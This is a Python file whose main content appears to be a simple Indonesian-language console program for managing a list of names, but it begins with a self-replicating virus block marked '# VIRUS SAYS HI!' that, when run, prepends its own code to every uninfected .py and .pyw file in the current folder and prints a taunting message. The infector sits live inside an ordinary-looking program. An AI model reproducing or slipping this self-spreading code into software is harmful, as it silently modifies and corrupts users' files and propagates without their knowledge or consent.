# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()

# VIRUS SAYS BYE!
import os


def cetak_menu():
    print("*******************************")
    print("1. Lihat daftar nama")
    print("2. Tambah nama ke daftar")
    print("3. Hapus nama dari daftar")
    print("4. Ubah/Perbarui nama di daftar")
    print("Q. Keluar dari program")
    print("*******************************")


def lihat_daftar_nama():
    os.system("cls")
    print("-DAFTAR NAMA-")
    if len(daftarNama) > 0:
        index = 0
        while index < len(daftarNama):
            print(index, ".", daftarNama[index])
            index += 1
    else:
        print("Daftar Nama Kosong")
    input("Tekan ENTER untuk kembali ke MENU")


def tambah_nama():
    os.system("cls")
    print("-TAMBAH NAMA-")
    nama_baru = input("Masukkan nama yang akan ditambah : ")
    if len(nama_baru) > 0:
        daftarNama.append(nama_baru)
        print("Nama tersimpan!")
    else:
        print("Nama tidak boleh kosong!")
    input("Tekan ENTER untuk kembali ke MENU")


def hapus_nama():
    os.system("cls")
    print("-HAPUS NAMA-")
    nama_dihapus = input("Masukkan nama yang akan dihapus : ")
    if nama_dihapus in daftarNama:
        daftarNama.remove(nama_dihapus)
        print("Nama telah dihapus!")
    else:
        print("Nama tidak ditemukan!")
    input("Tekan ENTER untuk kembali ke MENU")


def perbarui_nama():
    os.system("cls")
    print("-GANTI NAMA-")
    nama_diganti = input("Masukan nama yang ingin diganti : ")
    if nama_diganti in daftarNama:
        index_nama = daftarNama.index(nama_diganti)
        nama_baru = input("Masukan nama barunya : ")
        daftarNama[index_nama] = nama_baru
        print("Nama telah diganti")
    else:
        print("Nama yang dimasukkan tidka ditemukan")
    input("Tekan tombol enter untuk kembali ke menu")
   
daftarNama = []
pilihan = None
error = False

while not error:

    cetak_menu()

    pilihan = input("Pilih Menu : ")

    if pilihan == "1":
        lihat_daftar_nama()
    elif pilihan == "2":
        tambah_nama()
    elif pilihan == "3":
        hapus_nama()
    elif pilihan == "4":
        perbarui_nama()
    elif pilihan == "Q":
        error = True